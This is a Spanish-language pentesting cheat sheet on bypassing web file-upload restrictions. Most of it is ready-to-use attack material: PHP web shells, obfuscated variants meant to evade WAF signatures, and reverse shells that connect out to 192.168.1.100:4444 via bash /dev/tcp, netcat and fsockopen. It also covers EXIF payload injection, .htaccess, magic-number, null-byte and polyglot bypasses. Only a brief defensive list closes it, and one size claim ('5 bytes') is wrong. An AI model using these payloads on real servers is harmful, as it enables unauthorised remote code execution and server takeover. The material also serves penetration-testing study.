---

---
---
Tags: #fileUpload #web #bypass #php #extension #archivos

---
## ✅ ¿Qué es?

> El **File Upload Bypass** es una técnica usada para **evadir restricciones en la subida de archivos** en aplicaciones web y conseguir subir un archivo malicioso (por ejemplo, un WebShell o script) que luego pueda ejecutarse en el servidor.

Este bypass puede ser necesario porque:

- El servidor **valida solo por extensión o Content-Type**.
    
- Existen restricciones de **tamaño** o **nombre**.
    
- Hay validaciones insuficientes en el **contenido real del archivo**.
    

---

## 🔍 **Métodos de detección de validaciones**

|Validación posible|Cómo detectarla|
|---|---|
|Extensión|Subir `.php` → ver si rechaza, probar `.php.jpg`|
|Content-Type|Interceptar subida con Burp y cambiar `Content-Type`|
|Magic Number|Cambiar cabecera binaria del archivo para ver si detecta|
|Tamaño máximo|Subir un archivo grande y ver si rechaza|
|Hash del nombre|Ver si cambia el nombre en el servidor|
|Carpeta de subida sin ejecución|Intentar acceder al archivo y ver si se ejecuta|

---
## 📂 Ejemplos de Códigos Maliciosos para Pruebas de File Upload

### 📌 **Básicos (Ejecución de comandos)**

```php
<?php system("whoami"); ?>
```

```php
<?php system($_GET['cmd']); ?>
```

```php
<?php echo shell_exec($_REQUEST['cmd']); ?>
```

```php
<?php passthru($_GET['cmd']); ?>
```

```php
<?php exec($_POST['cmd']); ?>
```

```php
<?=`$_GET[0]`?>
```

_(Forma corta `<?=` para `<?php echo`)_

---

### 📌 **Bypass con variables dinámicas**

```php
<?php $a='sys';$b='tem';$c=$a.$b;$c($_GET['cmd']); ?>
```

_(Evade algunas detecciones por firmas exactas de `system`)_

```php
<?php $_="`";$_=${'_'.'_'};echo $_($_POST['cmd']); ?>
```

_(Ofuscación para evadir WAFs)_

---

### 📌 **Reverse Shells**

**Conexión Bash**

```php
<?php system("bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'"); ?>
```

**Usando `nc` (netcat)**

```php
<?php system("nc -e /bin/bash 192.168.1.100 4444"); ?>
```

**Usando `php` puro**

```php
<?php $ip = '192.168.1.100';  $port = 4444; $sock = fsockopen($ip, $port); exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

---

### 📌 **Reverse Shell con URL-encoding para subir en un solo GET**

```php
<?php system("bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261'"); ?>
```

_(Evita problemas con espacios o caracteres especiales en ciertas validaciones)_

---

### 📌 **Payload en Metadatos de Imagen (Exif)**

Usando **exiftool**:

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' imagen.jpg
```

Luego renombrar `imagen.jpg` a `imagen.php` o a `imagen.php.jpg` para doble extensión.

---

### 📌 **Webshells Completos**

**Mini Webshell**

```php
<?php if(isset($_REQUEST['cmd'])){echo "<pre>";system($_REQUEST['cmd']);echo "</pre>";} ?>
```

**WSO Shell (Web Shell by Orb)**  
_(Muy detectado por antivirus, pero útil en pruebas controladas)_

```php
<?php /* contenido del WSO Shell */ ?>
```

_(Este es grande, no se recomienda en entornos no controlados)_

---

📌 **Tip adicional:** Si el servidor hace un `md5sum` del nombre del archivo subido, puedes:

1. Subir un archivo y luego interceptar la respuesta o el contenido de la carpeta (si es listable) para ver el hash real.
    
2. Usar un diccionario de nombres para adivinarlo si es basado en nombre original + timestamp.
    
3. Si tienes LFI o Directory Traversal, buscar por patrón de hash (`find /var/www/html/uploads -type f -name "*<hash>*"`).
---
## 🧨 **Técnicas de bypass**

### 1️⃣ **Bypass por extensión**

Algunos servidores solo validan la **extensión del nombre de archivo**.

|Técnica|Ejemplo|Notas|
|---|---|---|
|**Doble extensión**|`shell.php.jpg`|Algunos interpretan `.php` antes que `.jpg`|
|**Extensión en mayúsculas**|`shell.PHP`|Windows no diferencia mayúsculas/minúsculas|
|**Extensión no estándar pero interpretable**|`shell.pht`, `shell.phar`, `shell.php5`, `shell.phtml`|Apache y otros pueden ejecutarlos|
|**Caracteres especiales**|`shell.php%00.jpg`|`%00` es un NULL byte que corta el nombre en servidores antiguos|
|**Agregar punto final**|`shell.php.`|IIS y Apache en Windows pueden ignorarlo|

---

### 2️⃣ **Bypass por tamaño máximo del archivo**

Si existe un límite como **100 KB**:

- **Minificar** el código malicioso → eliminar espacios y saltos de línea.
    
- **Codificar** la carga en una sola línea.
    

Ejemplo PHP WebShell minificado:

`<?php system($_GET['cmd']); ?>`

(5 bytes si se elimina todo lo innecesario).

---

### 3️⃣ **Bypass por Content-Type**

En el **encabezado HTTP**, el cliente indica qué tipo de archivo está subiendo.

Si el servidor solo confía en este valor, puedes modificarlo en Burp Suite:

`Content-Type: image/png`

Pero el contenido real puede ser PHP.

Ejemplo:

`POST /upload HTTP/1.1 Content-Type: image/png  <?php system($_GET['cmd']); ?>`

---

### 4️⃣ **Bypass por Magic Numbers**

Los **Magic Numbers** son los primeros bytes de un archivo que indican su tipo real.

Puedes modificar estos bytes para que parezca una imagen pero siga conteniendo código.

| Formato | Magic Number              | Ejemplo             |
| ------- | ------------------------- | ------------------- |
| PNG     | `89 50 4E 47 0D 0A 1A 0A` | `\x89PNG\r\n\x1a\n` |
| GIF     | `47 49 46 38`             | `GIF89a` `GIF87a`   |
| JPG     | `FF D8 FF`                | `ÿØÿ`               |

**Ejemplo:**

`GIF8; <?php system($_GET['cmd']); ?>`

Esto hará que el archivo pase como `.gif` pero al ejecutarse como `.php` funcionará.

---

### 5️⃣ **Bypass por nombre de archivo con hash (md5/sha1)**

Algunos sistemas renombrarán tu archivo como:

`uploads/3a7bd3e2360a3d4854279df00c91f314.php`

Para encontrarlo:

1. Subir un archivo legítimo llamado `test.png`.
    
2. Ver el nombre en la respuesta o fuente HTML.
    
3. Calcular el hash con:
    
    `md5sum test.png`
    
4. Usar el mismo procedimiento con tu archivo malicioso → sabrás el nombre final.
    

---

### 6️⃣ **Bypass con `.htaccess`**

Si el servidor permite subir `.htaccess`, puedes forzar que trate todos los archivos como PHP:

- Debajo de Content-Type: en Burpsuite.

`AddType application/x-httpd-php .jpg`

Ahora `shell.jpg` será interpretado como PHP.

---

### 7️⃣ **Bypass por metadatos**

Puedes ocultar código malicioso en los metadatos EXIF de una imagen.

Ejemplo:

`exiftool -Comment='<?php system($_GET["cmd"]); ?>' imagen.jpg`

Si la app extrae metadatos y los ejecuta, tendrás RCE.

---

### 8️⃣ **Bypass por truncamiento**

Algunos sistemas cortan el nombre al encontrar un carácter especial como `#`, `%20`, `%00`.

Ejemplo:

`shell.php%00.jpg`

En sistemas antiguos, se guardará como `shell.php`.

---

### 9️⃣ **Polyglot Files**

Un archivo que es **válido para dos formatos**:  
Por ejemplo, un archivo que es **imagen y PHP** al mismo tiempo.

Ejemplo:

`cat image.png shell.php > polyglot.png`

Si se interpreta como imagen, se ve normal.  
Si el servidor lo procesa como PHP, se ejecuta.

---

## 📋 **Tabla de métodos**

|Método|Descripción|Ejemplo|
|---|---|---|
|Doble extensión|Añadir `.jpg` a `.php`|`shell.php.jpg`|
|Mayúsculas|Cambiar `.php` a `.PHP`|`shell.PHP`|
|Extensión alternativa|Usar `.pht`|`shell.pht`|
|Magic Numbers falsos|Encabezado de imagen + PHP|`GIF8;<?php ... ?>`|
|Content-Type falso|Modificar en Burp|`Content-Type: image/png`|
|`.htaccess`|Cambiar interpretación|`AddType application/x-httpd-php .jpg`|
|Metadatos|Código en EXIF|`exiftool -Comment='code'`|
|Truncamiento|Usar `%00`|`shell.php%00.jpg`|
|Polyglot|Imagen + PHP|`cat img.png shell.php`|

---

## 🔐 **Buenas prácticas de defensa**

- Validar **extensión y contenido real**.
    
- Usar **listas blancas** de formatos.
    
- Procesar archivos en **servidores sin ejecución**.
    
- Escanear con **antivirus**.
    
- Renombrar archivos con UUIDs y almacenar fuera del directorio web.

---
# Referencias
- File Uploads - Hack Tricks:[Enlace](https://hacktricks.boitatech.com.br/pentesting-web/file-upload)